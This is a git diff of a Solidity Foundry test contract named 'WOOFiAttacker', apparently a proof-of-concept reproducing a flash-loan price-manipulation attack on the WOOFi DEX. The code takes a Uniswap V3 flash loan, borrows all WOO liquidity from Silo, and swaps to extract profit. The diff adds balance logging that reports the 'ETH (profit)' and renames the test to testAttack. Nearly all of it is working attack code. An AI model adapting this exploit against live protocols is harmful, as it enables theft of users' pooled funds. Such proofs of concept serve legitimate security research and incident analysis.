@@ -62,7 +62,6 @@ contract WOOFiAttacker is Test {
         bytes32 totalFees,
         bytes calldata data
     ) external returns (bytes32) {
-        console.log("got here");
         // deposit USDC and borrow all the WOO liquidity (idk if Woo oracle  using Silo for pricing or whether this is just to get even bigger WOO balance)
         SILO.deposit(USDC, 7000000000000, true);
         uint256 amount = SILO.liquidity(WOO);
@@ -95,7 +94,6 @@ contract WOOFiAttacker is Test {
     /// @notice Calls the pools flash function with data needed in `uniswapV3FlashCallback`
     function initFlash() public {
         // inital approvals required for the tokens 
-        console.log("here2");
         IERC20(WOO).approve(address(WOOPPV2), max);
         IERC20(WOO).approve(address(SILO), max);
         IERC20(USDC).approve(address(SILO), max);
@@ -110,19 +108,31 @@ contract WOOFiAttacker is Test {
         // swap excess USDC for WETH
         POOL.swap(address(this), false, 141601385099, 5148059652436460709226212, new bytes(0));
         // send excess WOO to another address (which converts to ETH)
-        uint256 excessETHBalance = IERC20(WETH).balanceOf(address(this));
-        IWETH(WETH).withdraw(excessETHBalance);
+        uint256 excessWETHBalance = IERC20(WETH).balanceOf(address(this));
+        IWETH(WETH).withdraw(excessWETHBalance);
         uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
-        IERC20(WOO).transfer(address(this), excessWOOBalance);
+        //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
     }
 
-    function testPoc() public {
-        // perform the attack!
-        console.log("here");
+    function testAttack() public {
+        console.log("Attacker's balance before:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e18, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        uint256 ethBalanceBefore = address(this).balance;
+        console.log("ETH:", ethBalanceBefore / 1e18, "ETH");
         
+        console.log("");
         initFlash();
+        console.log("Attacker's balance after:");
+        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e18, "USDC");
+        console.log("WOO:", IERC20(WOO).balanceOf(address(this)) / 1e18, "WOO");
+        console.log("WETH:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
+        uint256 ethBalanceAfter = address(this).balance;
+        console.log("ETH (profit):", (ethBalanceAfter - ethBalanceBefore) / 1e18, "ETH");
+
     }
 
-    fallback() external payable {}
+    receive() external payable {}
     
 }
